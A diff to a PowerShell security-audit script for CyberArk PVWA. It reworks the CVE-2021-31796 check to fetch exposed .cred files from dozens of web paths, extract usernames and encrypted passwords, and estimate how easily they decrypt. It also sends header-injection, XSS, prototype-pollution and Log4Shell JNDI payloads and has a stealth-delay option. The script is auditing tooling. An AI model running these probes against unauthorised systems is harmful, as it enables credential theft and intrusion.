@@ -15,7 +15,7 @@
     - Blackbox security testing (exposed endpoints, information disclosure, etc.)
     - Network security analysis (port scanning, vault port security)
     - SSL/TLS cipher suite enumeration
-    - CVE-specific vulnerability checks (CVE-2021-31796, CVE-2022-22536, CVE-2023-43903, etc.)
+    - CVE-specific vulnerability checks (CVE-2021-31796, CVE-2024-42339, CVE-2024-42340, etc.)
     - 2025 CVE coverage (CVE-2025-22270 through CVE-2025-49831)
     - API security testing (BOLA, injection, mass assignment)
     - Session security and header injection testing
@@ -101,7 +101,8 @@
     - Blackbox Controls (BB1 - BB11): External security testing
     - Network Controls (NET1 - NET7): Network security analysis
     - TLS Controls (TLS1 - TLS4): SSL/TLS configuration
-    - CVE Controls (CVE1 - CVE15): Known vulnerability checks (2021-2025)
+    - CVE Controls (CVE1 - CVE14): Known CyberArk vulnerability checks (2021-2025)
+    - Third-Party Controls (TP1 - TP3): Third-party library vulnerability checks (Log4j, Spring, ag-grid)
     - CA Controls (CA25-x): CyberArk security bulletin checks
     - Machine Identity (MID1 - MID9): Service account, AppID, and AIM Provider security
     - Secrets Management (SEC1 - SEC14): Credential Provider and Conjur security
@@ -517,15 +518,15 @@ $script:Config = @{
     # Known vulnerable CyberArk versions (major.minor)
     VulnerableVersions = @{
         "10.9"  = @("CVE-2021-31796")
-        "10.10" = @("CVE-2021-31796", "CVE-2021-44228")
-        "11.0"  = @("CVE-2021-44228")
-        "11.1"  = @("CVE-2022-22536")
-        "11.2"  = @("CVE-2022-22536")
-        "12.0"  = @("CVE-2023-43903")
-        "12.1"  = @("CVE-2023-43903")
+        "10.10" = @("CVE-2021-31796", "TP3-Log4Shell")
+        "11.0"  = @("TP3-Log4Shell")
+        "11.1"  = @()
+        "11.2"  = @()
+        "12.0"  = @()
+        "12.1"  = @()
         "12.2"  = @("CVE-2024-42339", "CVE-2024-42340")
         "14.0"  = @("CVE-2025-49827", "CVE-2025-49828", "CVE-2025-49829", "CVE-2025-49830", "CVE-2025-49831", "CA25-32")
-        "14.2"  = @("CVE-2024-38996", "CA25-34", "CA25-35")
+        "14.2"  = @("TP2-ag-grid", "CA25-34", "CA25-35")
         "24.7"  = @("CVE-2025-22270", "CVE-2025-22271", "CVE-2025-22272", "CVE-2025-22273", "CVE-2025-22274")  # EPM SaaS
     }
 
@@ -675,10 +676,10 @@ $script:CISControls = @{
     "TLS3" = "Certificate chain validation"
     "TLS4" = "OCSP/CRL checking"
     # CVE-Specific Controls (CVE prefix)
-    "CVE1" = "CVE-2021-31796 (SSRF)"
-    "CVE2" = "CVE-2022-22536 (Authentication Bypass)"
-    "CVE3" = "CVE-2023-43903 (XSS)"
-    "CVE4" = "CVE-2022-22965 (Spring4Shell)"
+    "CVE1" = "CVE-2021-31796 (Credential File Weak Key Derivation)"
+    "BB12" = "Authentication Bypass via Header Injection"
+    "BB13" = "XSS Vulnerability Patterns"
+    "TP1" = "Third-Party: Spring4Shell (CVE-2022-22965)"
     "CVE5" = "CVE-2024-42340 (DOM XSS)"
     "CVE6" = "CVE-2024-42339 (HTML Injection)"
     "CVE7" = "CVE-2025-22270 (EPM HTML Injection)"
@@ -689,7 +690,8 @@ $script:CISControls = @{
     "CVE12" = "CVE-2025-49827 (Secrets Manager IAM Bypass)"
     "CVE13" = "CVE-2025-49828 (Secrets Manager RCE)"
     "CVE14" = "CVE-2025-49831 (Secrets Manager Network Bypass)"
-    "CVE15" = "CVE-2024-38996 (PVWA Prototype Pollution)"
+    "TP2" = "Third-Party: ag-grid Prototype Pollution (CVE-2024-38996)"
+    "TP3" = "Third-Party: Log4Shell (CVE-2021-44228)"
     # Security Bulletin Controls (CA prefix)
     "CA25-25" = "Secrets Manager SaaS Edge DoS"
     "CA25-29" = "PVWA Prototype Pollution"
@@ -4226,39 +4228,423 @@ function Test-DNSSecurity {
 #======================================================================
 
 function Test-CVE202131796 {
-    Write-AuditLog "Checking for CVE-2021-31796 (SSRF vulnerability)..." -Level Info
-
-    # CVE-2021-31796: Server-Side Request Forgery in PVWA
-    $ssrfPayloads = @(
-        @{ Path = "/PasswordVault/api/Accounts?search=http://127.0.0.1"; Desc = "SSRF via search parameter" },
-        @{ Path = "/PasswordVault/api/Safes?search=http://localhost"; Desc = "SSRF via safe search" },
-        @{ Path = "/PasswordVault/api/ComponentsMonitoringDetails?url=http://127.0.0.1"; Desc = "SSRF via component URL" }
+    <#
+    .SYNOPSIS
+        CVE-2021-31796: CyberArk Credential File Insufficient Effective Key Space
+        Remote exploitation check for exposed .cred files
+    
+    .DESCRIPTION
+        This function performs REMOTE detection and analysis of exposed CyberArk credential files.
+        
+        CyberArk Credential Providers use .cred files with the following structure:
+        - CredFileVersion=2
+        - Username=<vault_user>
+        - VerificationsFlag=<bitmask>
+        - Password=<hex_encrypted_password>  (AES-256-CBC encrypted)
+        - AdditionalInformation=<160-bit_salt_hex>
+        - ClientApp, AppPath, ClientIP, ClientHostname, OSUser (optional restrictions)
+        
+        VerificationsFlag Bitmask (determines key derivation inputs):
+        - 0x0001 (Bit 0): ClientApp      - 15 known values (CPM, PVWA, AppPrv, etc.)
+        - 0x0002 (Bit 1): AppPath        - Executable path  
+        - 0x0004 (Bit 2): ClientIP       - IP address
+        - 0x0008 (Bit 3): OSUser         - OS username
+        - 0x0010 (Bit 4): AdditionalInfo - Salt (visible in file = 0 entropy!)
+        - 0x0020 (Bit 5): ClientHostname - Hostname
+        
+        CRITICAL: If VerificationsFlag = 16 (0x0010), the encryption key is DETERMINISTIC 
+        from file contents alone - instant decryption with known algorithm!
+        
+        Affected: Versions prior to 12.1
+        Reference: https://korelogic.com/Resources/Advisories/KL-001-2021-008.txt
+    #>
+    
+    Write-AuditLog "Checking for CVE-2021-31796 (Exposed Credential Files - Remote Exploitation)..." -Level Info
+    
+    # Known CyberArk application types - only 15 valid values = ~4 bits entropy
+    $script:KnownAppTypes = @(
+        "CPM", "PVWA", "PVWAApp", "AppPrv", "PSMApp", "CABACKUP", 
+        "DR", "ENE", "WINCLIENT", "GUI", "PACLI", "XAPI", "NAPI", "EVD", "CACrypt"
     )
-
-    foreach ($payload in $ssrfPayloads) {
-        try {
-            $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-            [void](Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue)
-            $stopwatch.Stop()
-
-            # Check for timing differences that might indicate SSRF
-            if ($stopwatch.ElapsedMilliseconds -gt 5000) {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE1" `
-                    -Finding "Potential CVE-2021-31796 (SSRF) vulnerability" `
-                    -Resource $payload.Path `
-                    -CurrentValue "Delayed response ($($stopwatch.ElapsedMilliseconds)ms)" `
-                    -ExpectedValue "Immediate error response" `
-                    -Recommendation "Apply CyberArk security patch for CVE-2021-31796" `
-                    -Severity "Critical"
+    
+    function Get-CredFileKeySpaceAnalysis {
+        param(
+            [int]$VerificationsFlag,
+            [hashtable]$ParsedFile
+        )
+        
+        $analysis = @{
+            FlagsUsed = @()
+            FlagsMissing = @()
+            EffectiveKeySpaceBits = 0
+            BruteForceComplexity = ""
+            Exploitability = ""
+            Severity = "Info"
+            Description = ""
+        }
+        
+        # Analyze each flag and calculate remaining entropy for an attacker
+        # Key insight: If the value is VISIBLE in the file, it adds 0 entropy!
+        
+        if ($VerificationsFlag -band 0x0001) {
+            $analysis.FlagsUsed += "ClientApp"
+            if ($ParsedFile.ClientApp) {
+                # Value visible in file - 0 additional entropy
+                $analysis.FlagsUsed[-1] = "ClientApp='$($ParsedFile.ClientApp)' [VISIBLE]"
+            }
+            else {
+                # Hidden but only 15 possible values
+                $analysis.EffectiveKeySpaceBits += 4
+                $analysis.FlagsUsed[-1] = "ClientApp [HIDDEN - 15 values to try]"
+            }
+        } else { 
+            $analysis.FlagsMissing += "ClientApp" 
+        }
+        
+        if ($VerificationsFlag -band 0x0002) {
+            $analysis.FlagsUsed += "AppPath"
+            if ($ParsedFile.AppPath) {
+                $analysis.FlagsUsed[-1] = "AppPath='$($ParsedFile.AppPath)' [VISIBLE]"
+            }
+            else {
+                $analysis.EffectiveKeySpaceBits += 8  # ~256 CyberArk paths
+                $analysis.FlagsUsed[-1] = "AppPath [HIDDEN - ~256 paths to try]"
+            }
+        } else { 
+            $analysis.FlagsMissing += "AppPath" 
+        }
+        
+        if ($VerificationsFlag -band 0x0004) {
+            $analysis.FlagsUsed += "ClientIP"
+            if ($ParsedFile.ClientIP) {
+                $analysis.FlagsUsed[-1] = "ClientIP='$($ParsedFile.ClientIP)' [VISIBLE]"
+            }
+            else {
+                $analysis.EffectiveKeySpaceBits += 8  # ~256 IPs in typical network
+                $analysis.FlagsUsed[-1] = "ClientIP [HIDDEN - ~256 IPs to try]"
+            }
+        } else { 
+            $analysis.FlagsMissing += "ClientIP" 
+        }
+        
+        if ($VerificationsFlag -band 0x0008) {
+            $analysis.FlagsUsed += "OSUser"
+            if ($ParsedFile.OSUser) {
+                $analysis.FlagsUsed[-1] = "OSUser='$($ParsedFile.OSUser)' [VISIBLE]"
+            }
+            else {
+                $analysis.EffectiveKeySpaceBits += 8  # ~256 typical users
+                $analysis.FlagsUsed[-1] = "OSUser [HIDDEN - ~256 users to try]"
+            }
+        } else { 
+            $analysis.FlagsMissing += "OSUser" 
+        }
+        
+        if ($VerificationsFlag -band 0x0010) {
+            # AdditionalInfo (salt) is ALWAYS visible in the file!
+            $analysis.FlagsUsed += "AdditionalInfo='$($ParsedFile.AdditionalInformation)' [VISIBLE - 0 entropy!]"
+        } else { 
+            $analysis.FlagsMissing += "AdditionalInfo" 
+        }
+        
+        if ($VerificationsFlag -band 0x0020) {
+            $analysis.FlagsUsed += "ClientHostname"
+            if ($ParsedFile.ClientHostname) {
+                $analysis.FlagsUsed[-1] = "ClientHostname='$($ParsedFile.ClientHostname)' [VISIBLE]"
+            }
+            else {
+                $analysis.EffectiveKeySpaceBits += 8  # ~256 hostnames
+                $analysis.FlagsUsed[-1] = "ClientHostname [HIDDEN - ~256 hostnames to try]"
+            }
+        } else { 
+            $analysis.FlagsMissing += "ClientHostname" 
+        }
+        
+        # Determine exploitability based on effective key space
+        if ($VerificationsFlag -eq 16 -or $analysis.EffectiveKeySpaceBits -eq 0) {
+            $analysis.Severity = "Critical"
+            $analysis.EffectiveKeySpaceBits = 0
+            $analysis.BruteForceComplexity = "NONE - Instant decryption"
+            $analysis.Exploitability = "TRIVIAL"
+            $analysis.Description = "IMMEDIATE EXPLOITATION POSSIBLE: All key derivation inputs are visible in the file. Decryption key can be computed directly with known algorithm (SHA1 + AES-256-CBC)."
+        }
+        elseif ($analysis.EffectiveKeySpaceBits -le 12) {
+            $analysis.Severity = "Critical"
+            $analysis.BruteForceComplexity = "~$([math]::Pow(2, $analysis.EffectiveKeySpaceBits)) attempts (< 1 second)"
+            $analysis.Exploitability = "TRIVIAL"
+            $analysis.Description = "Trivially exploitable. Only $($analysis.EffectiveKeySpaceBits) bits of hidden key material. Brute-force in under 1 second on any hardware."
+        }
+        elseif ($analysis.EffectiveKeySpaceBits -le 20) {
+            $analysis.Severity = "Critical"
+            $analysis.BruteForceComplexity = "~$([math]::Pow(2, $analysis.EffectiveKeySpaceBits)) attempts (seconds to minutes)"
+            $analysis.Exploitability = "EASY"
+            $analysis.Description = "Easily exploitable. $($analysis.EffectiveKeySpaceBits) bits effective key space. Brute-force completes in seconds to minutes."
+        }
+        elseif ($analysis.EffectiveKeySpaceBits -le 32) {
+            $analysis.Severity = "High"
+            $analysis.BruteForceComplexity = "~$([math]::Pow(2, $analysis.EffectiveKeySpaceBits)) attempts (hours on single GPU)"
+            $analysis.Exploitability = "MODERATE"
+            $analysis.Description = "Exploitable with moderate effort. $($analysis.EffectiveKeySpaceBits) bits key space. Crackable in hours with GPU."
+        }
+        elseif ($analysis.EffectiveKeySpaceBits -le 40) {
+            $analysis.Severity = "Medium"
+            $analysis.BruteForceComplexity = "~$([math]::Pow(2, $analysis.EffectiveKeySpaceBits)) attempts (days with GPU cluster)"
+            $analysis.Exploitability = "DIFFICULT"
+            $analysis.Description = "Exploitable with significant resources. $($analysis.EffectiveKeySpaceBits) bits key space. Requires dedicated hardware."
+        }
+        else {
+            $analysis.Severity = "Low"
+            $analysis.BruteForceComplexity = "~$([math]::Pow(2, $analysis.EffectiveKeySpaceBits)) attempts (computationally expensive)"
+            $analysis.Exploitability = "IMPRACTICAL"
+            $analysis.Description = "Difficult to exploit. $($analysis.EffectiveKeySpaceBits) bits effective key space provides reasonable protection."
+        }
+        
+        return $analysis
+    }
+    
+    function ConvertFrom-CredentialFile {
+        param([string]$Content, [string]$Source)
+        
+        $credFile = @{
+            Source = $Source
+            CredFileVersion = $null
+            CredFileType = $null
+            VerificationsFlag = $null
+            Username = $null
+            Password = $null
+            ClientApp = $null
+            AppPath = $null
+            ClientIP = $null
+            ClientHostname = $null
+            OSUser = $null
+            AdditionalInformation = $null
+            ExternalAuthentication = $null
+        }
+        
+        foreach ($line in $Content -split "`r?`n") {
+            if ($line -match "^(\w+)=(.*)$") {
+                $key = $matches[1]
+                $value = $matches[2].Trim()
+                
+                switch ($key) {
+                    "CredFileType" { $credFile.CredFileType = $value }
+                    "CredFileVersion" { $credFile.CredFileVersion = $value }
+                    "VerificationsFlag" { 
+                        try { $credFile.VerificationsFlag = [int]$value } catch { }
+                    }
+                    "Username" { $credFile.Username = $value }
+                    "Password" { $credFile.Password = $value }
+                    "ClientApp" { $credFile.ClientApp = $value }
+                    "AppPath" { $credFile.AppPath = $value }
+                    "ClientIP" { $credFile.ClientIP = $value }
+                    "ClientHostname" { $credFile.ClientHostname = $value }
+                    "OSUser" { $credFile.OSUser = $value }
+                    "AdditionalInformation" { $credFile.AdditionalInformation = $value }
+                    "ExternalAuthentication" { $credFile.ExternalAuthentication = $value }
+                }
             }
         }
-        catch { }
+        
+        return $credFile
+    }
+    
+    function Format-ExploitAnalysis {
+        param([hashtable]$Parsed, [hashtable]$Analysis)
+        
+        $report = @"
+
+=== CVE-2021-31796 EXPLOITATION ANALYSIS ===
+Source: $($Parsed.Source)
+CredFileVersion: $($Parsed.CredFileVersion)
+VerificationsFlag: $($Parsed.VerificationsFlag) (0x$("{0:X4}" -f $Parsed.VerificationsFlag))
+
+[EXTRACTED VALUES]
+Username: $($Parsed.Username)
+Password (encrypted): $($Parsed.Password.Substring(0, [Math]::Min(32, $Parsed.Password.Length)))...
+AdditionalInfo (salt): $($Parsed.AdditionalInformation)
+
+[KEY DERIVATION INPUTS]
+$($Analysis.FlagsUsed -join "`n")
+
+[MISSING FLAGS (not used in key derivation)]
+$($Analysis.FlagsMissing -join ", ")
+
+[EXPLOITATION ASSESSMENT]
+Effective Key Space: 2^$($Analysis.EffectiveKeySpaceBits) ($($Analysis.BruteForceComplexity))
+Exploitability: $($Analysis.Exploitability)
+$($Analysis.Description)
+"@
+        return $report
+    }
+    
+    $exposedFilesFound = 0
+    
+    # Comprehensive list of paths to check for exposed credential files
+    $exposedCredPaths = @(
+        # PVWA web directory - common misconfigurations
+        @{ Path = "/PasswordVault/CredFile.cred"; Desc = "Default credential file" },
+        @{ Path = "/PasswordVault/user.cred"; Desc = "User credential file" },
+        @{ Path = "/PasswordVault/Vault.cred"; Desc = "Vault credential file" },
+        @{ Path = "/PasswordVault/vault.cred"; Desc = "Vault credential file (lowercase)" },
+        @{ Path = "/PasswordVault/AppUser.cred"; Desc = "App user credential file" },
+        @{ Path = "/PasswordVault/appuser.cred"; Desc = "App user credential file (lowercase)" },
+        @{ Path = "/PasswordVault/CPM.cred"; Desc = "CPM credential file" },
+        @{ Path = "/PasswordVault/cpm.cred"; Desc = "CPM credential file (lowercase)" },
+        @{ Path = "/PasswordVault/PVWA.cred"; Desc = "PVWA credential file" },
+        @{ Path = "/PasswordVault/pvwa.cred"; Desc = "PVWA credential file (lowercase)" },
+        @{ Path = "/PasswordVault/PSM.cred"; Desc = "PSM credential file" },
+        @{ Path = "/PasswordVault/psm.cred"; Desc = "PSM credential file (lowercase)" },
+        @{ Path = "/PasswordVault/PSMConnect.cred"; Desc = "PSM Connect credential file" },
+        @{ Path = "/PasswordVault/PSMAdminConnect.cred"; Desc = "PSM Admin Connect credential file" },
+        
+        # AIM/CCP web service paths
+        @{ Path = "/AIMWebService/CredFile.cred"; Desc = "AIM credential file" },
+        @{ Path = "/AIMWebService/AppPath.cred"; Desc = "AIM AppPath credential file" },
+        @{ Path = "/AIMWebService/user.cred"; Desc = "AIM user credential file" },
+        @{ Path = "/AIMWebService/api.cred"; Desc = "AIM API credential file" },
+        
+        # Central Credential Provider paths
+        @{ Path = "/CCP/CredFile.cred"; Desc = "CCP credential file" },
+        @{ Path = "/CCP/user.cred"; Desc = "CCP user credential file" },
+        
+        # V10/V11 API paths
+        @{ Path = "/v10/CredFile.cred"; Desc = "v10 API credential file" },
+        @{ Path = "/v11/CredFile.cred"; Desc = "v11 API credential file" },
+        
+        # Backup/misconfigured paths
+        @{ Path = "/CredFile.cred"; Desc = "Root credential file" },
+        @{ Path = "/cred/CredFile.cred"; Desc = "Cred directory" },
+        @{ Path = "/credentials/user.cred"; Desc = "Credentials directory" },
+        @{ Path = "/config/CredFile.cred"; Desc = "Config directory" },
+        @{ Path = "/PasswordVault/App_Data/CredFile.cred"; Desc = "App_Data credential file" },
+        @{ Path = "/PasswordVault/bin/CredFile.cred"; Desc = "Bin directory credential file" },
+        @{ Path = "/PasswordVault/scripts/CredFile.cred"; Desc = "Scripts directory" },
+        
+        # Backup file extensions
+        @{ Path = "/PasswordVault/CredFile.cred.bak"; Desc = "Backup credential file" },
+        @{ Path = "/PasswordVault/CredFile.cred.old"; Desc = "Old credential file" },
+        @{ Path = "/PasswordVault/CredFile.cred.backup"; Desc = "Backup credential file" },
+        @{ Path = "/PasswordVault/CredFile.cred.orig"; Desc = "Original credential file" },
+        @{ Path = "/PasswordVault/CredFile.cred~"; Desc = "Temp credential file" },
+        
+        # Common component credential files
+        @{ Path = "/PasswordVault/PasswordManagerUser.cred"; Desc = "Password Manager User" },
+        @{ Path = "/PasswordVault/VaultOperationsUser.cred"; Desc = "Vault Operations User" },
+        @{ Path = "/PasswordVault/Sync.cred"; Desc = "Sync credential file" },
+        @{ Path = "/PasswordVault/DR.cred"; Desc = "DR credential file" },
+        @{ Path = "/PasswordVault/Backup.cred"; Desc = "Backup credential file" },
+        @{ Path = "/PasswordVault/Master.cred"; Desc = "Master credential file" },
+        @{ Path = "/PasswordVault/Administrator.cred"; Desc = "Administrator credential file" }
+    )
+    
+    Write-AuditLog "Probing $($exposedCredPaths.Count) potential credential file locations..." -Level Info
+    
+    foreach ($credPath in $exposedCredPaths) {
+        try {
+            # Add delay if stealth mode is enabled
+            if ($script:Config.StealthDelayMs -gt 0) {
+                Start-Sleep -Milliseconds $script:Config.StealthDelayMs
+            }
+            
+            $uri = "$PVWA$($credPath.Path)"
+            $response = Invoke-WebRequest -Uri $uri -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
+            
+            if ($response.StatusCode -eq 200) {
+                $content = $response.Content
+                
+                # Validate it's a real CyberArk credential file (version 2 format)
+                if ($content -match "CredFileVersion=2" -and 
+                    $content -match "Password=[A-Fa-f0-9]{32,}" -and
+                    $content -match "VerificationsFlag=\d+") {
+                    
+                    $exposedFilesFound++
+                    $parsed = ConvertFrom-CredentialFile -Content $content -Source $uri
+                    
+                    if ($null -ne $parsed.VerificationsFlag) {
+                        $analysis = Get-CredFileKeySpaceAnalysis -VerificationsFlag $parsed.VerificationsFlag -ParsedFile $parsed
+                        
+                        # Log detailed analysis
+                        $exploitReport = Format-ExploitAnalysis -Parsed $parsed -Analysis $analysis
+                        Write-AuditLog $exploitReport -Level Warning
+                        
+                        # Build detailed current value for finding
+                        $currentValue = @(
+                            "CREDENTIAL FILE EXPOSED!",
+                            "Username: $($parsed.Username)",
+                            "VerificationsFlag: $($parsed.VerificationsFlag) (0x$("{0:X4}" -f $parsed.VerificationsFlag))",
+                            "Exploitability: $($analysis.Exploitability)",
+                            "Brute-force: $($analysis.BruteForceComplexity)",
+                            "",
+                            "Key derivation inputs found in file:",
+                            ($analysis.FlagsUsed -join "; ")
+                        ) -join "`n"
+                        
+                        Add-Finding -Category "CVE Assessment" `
+                            -CISControl "CVE1" `
+                            -Finding "CVE-2021-31796: EXPLOITABLE - Credential file exposed via web" `
+                            -Resource $uri `
+                            -CurrentValue $currentValue `
+                            -ExpectedValue "Credential files must NEVER be web-accessible. These files contain encrypted passwords that can be decrypted offline." `
+                            -Recommendation "IMMEDIATE ACTION REQUIRED: (1) Remove credential file from web directory, (2) Rotate ALL credentials for user '$($parsed.Username)', (3) Review IIS/web server configuration, (4) Upgrade to CyberArk v12.1+, (5) Recreate credential files with -DisplayRestrictions to hide field values." `
+                            -Severity "Critical"
+                        
+                        # Additional finding if trivially exploitable
+                        if ($analysis.Exploitability -in @("TRIVIAL", "EASY")) {
+                            Add-Finding -Category "CVE Assessment" `
+                                -CISControl "CVE1" `
+                                -Finding "CVE-2021-31796: Password can be decrypted IMMEDIATELY" `
+                                -Resource "$uri (User: $($parsed.Username))" `
+                                -CurrentValue "Effective key space: 2^$($analysis.EffectiveKeySpaceBits). $($analysis.Description)" `
+                                -ExpectedValue "Encryption key should require brute-force attack with significant compute resources" `
+                                -Recommendation "ASSUME CREDENTIAL IS COMPROMISED. Immediately: (1) Disable account '$($parsed.Username)' in the Vault, (2) Rotate any secrets this account can access, (3) Check audit logs for unauthorized access." `
+                                -Severity "Critical"
+                        }
+                    }
+                    else {
+                        # Could parse file but not VerificationsFlag
+                        Add-Finding -Category "CVE Assessment" `
+                            -CISControl "CVE1" `
+                            -Finding "CVE-2021-31796: Credential file exposed (parse error on flags)" `
+                            -Resource $uri `
+                            -CurrentValue "Credential file accessible but could not parse VerificationsFlag. Raw content may still be exploitable." `
+                            -ExpectedValue "Credential files must not be web-accessible" `
+                            -Recommendation "URGENT: Remove credential file from web directory immediately. Rotate all associated credentials." `
+                            -Severity "Critical"
+                    }
+                }
+                elseif ($content -match "CredFileVersion=" -or $content -match "Password=") {
+                    # Partial match - might be version 1 or malformed
+                    Add-Finding -Category "CVE Assessment" `
+                        -CISControl "CVE1" `
+                        -Finding "Potential credential file detected (non-standard format)" `
+                        -Resource $uri `
+                        -CurrentValue "File contains credential markers but may be version 1 or custom format" `
+                        -ExpectedValue "No credential files should be web-accessible" `
+                        -Recommendation "Investigate file contents. Remove from web directory if it contains credentials." `
+                        -Severity "High"
+                }
+            }
+        }
+        catch [System.Net.WebException] {
+            # 404, 403, etc. - expected, file is not exposed
+        }
+        catch {
+            # Other errors - log at debug level
+            Write-AuditLog "Error checking $($credPath.Path): $($_.Exception.Message)" -Level Debug
+        }
+    }
+    
+    # Summary
+    if ($exposedFilesFound -gt 0) {
+        Write-AuditLog "CRITICAL: Found $exposedFilesFound exposed credential file(s)! See findings for exploitation details." -Level Warning
+    }
+    else {
+        Write-AuditLog "No exposed credential files found via web interface probing." -Level Info
     }
 }
 
-function Test-CVE202222536 {
-    Write-AuditLog "Checking for CVE-2022-22536 (Authentication Bypass patterns)..." -Level Info
+function Test-HeaderAuthBypass {
+    Write-AuditLog "Checking for Authentication Bypass via Header Injection..." -Level Info
 
     # Test for authentication bypass patterns
     $bypassHeaders = @(
@@ -4277,8 +4663,8 @@ function Test-CVE202222536 {
             $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/Users" -Method GET -Headers $headers -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
 
             if ($response.StatusCode -eq 200) {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE2" `
+                Add-Finding -Category "Blackbox Testing" `
+                    -CISControl "BB12" `
                     -Finding "Potential authentication bypass via header injection" `
                     -Resource "PVWA Authentication" `
                     -CurrentValue "Header $($header.Name) accepted" `
@@ -4291,8 +4677,8 @@ function Test-CVE202222536 {
     }
 }
 
-function Test-CVE202343903 {
-    Write-AuditLog "Checking for CVE-2023-43903 (XSS vulnerability patterns)..." -Level Info
+function Test-XSSPatterns {
+    Write-AuditLog "Checking for XSS vulnerability patterns..." -Level Info
 
     # XSS test payloads
     $xssPayloads = @(
@@ -4308,13 +4694,13 @@ function Test-CVE202343903 {
 
             # Check if payload is reflected in response
             if ($response.Content -match "<script>|onerror=|javascript:") {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE3" `
-                    -Finding "Potential XSS vulnerability (CVE-2023-43903 pattern)" `
+                Add-Finding -Category "Blackbox Testing" `
+                    -CISControl "BB13" `
+                    -Finding "Potential XSS vulnerability detected" `
                     -Resource $payload.Path `
                     -CurrentValue "XSS payload reflected in response" `
                     -ExpectedValue "Input properly sanitized" `
-                    -Recommendation "Apply latest CyberArk security patches" `
+                    -Recommendation "Apply input validation and output encoding" `
                     -Severity "High"
             }
         }
@@ -4410,7 +4796,9 @@ function Test-AdditionalCVEs {
         catch { }
     }
 
-    # CVE-2021-44228 (Log4Shell) - Check if Java components exist
+    # Third-Party: CVE-2021-44228 (Log4Shell) - Check if Java components exist
+    # Note: This is an Apache Log4j vulnerability, not CyberArk-specific
+    # Relevant if CyberArk uses Java components with vulnerable Log4j versions
     $log4shellHeaders = @{
         "X-Api-Version" = '${jndi:ldap://log4shell-test.invalid/a}'
         "User-Agent" = '${jndi:ldap://log4shell-test.invalid/a}'
@@ -4420,13 +4808,13 @@ function Test-AdditionalCVEs {
         $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method GET -Headers $log4shellHeaders -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
 
         # Note: Actual detection would require out-of-band callback
-        Add-Finding -Category "CVE Assessment" `
-            -CISControl "BB11" `
+        Add-Finding -Category "Third-Party Vulnerabilities" `
+            -CISControl "TP3" `
             -Finding "Log4Shell payload sent (manual verification needed)" `
             -Resource "PVWA API" `
             -CurrentValue "Test payload injected - verify no callback received" `
             -ExpectedValue "No Log4j vulnerability" `
-            -Recommendation "Ensure all Java components are patched for CVE-2021-44228" `
+            -Recommendation "Ensure all Java components are patched for CVE-2021-44228 (Log4Shell)" `
             -Severity "Info" `
             -Status "Pass"
     }
@@ -4665,8 +5053,11 @@ function Test-CVE2025SecretsManager {
     }
 }
 
-function Test-CVE202438996 {
-    Write-AuditLog "Checking for CVE-2024-38996 (Prototype Pollution in PVWA)..." -Level Info
+function Test-PrototypePollution {
+    # Third-Party: CVE-2024-38996 - ag-grid Prototype Pollution
+    # Note: This is an ag-grid library vulnerability, not CyberArk-specific
+    # Relevant if CyberArk PVWA uses vulnerable ag-grid versions
+    Write-AuditLog "Checking for Third-Party Prototype Pollution (ag-grid CVE-2024-38996)..." -Level Info
 
     # Prototype pollution test payloads
     $protoPayloads = @(
@@ -4681,13 +5072,13 @@ function Test-CVE202438996 {
 
             # Check if prototype pollution had any effect
             if ($response.Content -match '"admin"\s*:\s*true|"isAdmin"\s*:\s*true|"authenticated"\s*:\s*true') {
-                Add-Finding -Category "CVE Assessment" `
-                    -CISControl "CVE15" `
-                    -Finding "Potential prototype pollution vulnerability (CVE-2024-38996)" `
+                Add-Finding -Category "Third-Party Vulnerabilities" `
+                    -CISControl "TP2" `
+                    -Finding "Potential prototype pollution vulnerability (ag-grid CVE-2024-38996)" `
                     -Resource $payload.Path `
                     -CurrentValue "Prototype properties may be processed" `
                     -ExpectedValue "__proto__ and constructor properties rejected" `
-                    -Recommendation "Upgrade PVWA to version 14.2.4 or later" `
+                    -Recommendation "Upgrade ag-grid to version 31.3.4+ or PVWA to latest version" `
                     -Severity "Medium"
             }
         }
@@ -5885,8 +6276,8 @@ function Test-ComponentVersions {
                         $vulnerableVersions = @{
                             "10.9" = "CVE-2021-31796"
                             "10.10" = "Multiple CVEs"
-                            "11.0" = "CVE-2021-44228 (if Java components)"
-                            "11.1" = "CVE-2022-22536"
+                            "11.0" = "TP3-Log4Shell (if Java components)"
+                            "11.1" = "Check for known vulnerabilities"
                         }
 
                         foreach ($vulnVersion in $vulnerableVersions.Keys) {
@@ -17381,8 +17772,8 @@ function Start-Audit {
         Write-Host "======================================================" -ForegroundColor Yellow
 
         try { Test-CVE202131796 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE1" -CheckName "CVE-2021-31796" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
-        try { Test-CVE202222536 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE2" -CheckName "CVE-2022-22536" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
-        try { Test-CVE202343903 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE3" -CheckName "CVE-2023-43903" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
+        try { Test-HeaderAuthBypass } catch { Add-SkippedCheck -Category "Blackbox Testing" -CISControl "BB12" -CheckName "Header Auth Bypass" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
+        try { Test-XSSPatterns } catch { Add-SkippedCheck -Category "Blackbox Testing" -CISControl "BB13" -CheckName "XSS Patterns" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
         try { Test-CVE202442340 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE5" -CheckName "CVE-2024-42340" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
         try { Test-CVE202442339 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE6" -CheckName "CVE-2024-42339" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
         try { Test-AdditionalCVEs } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "BB11" -CheckName "Additional CVEs" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
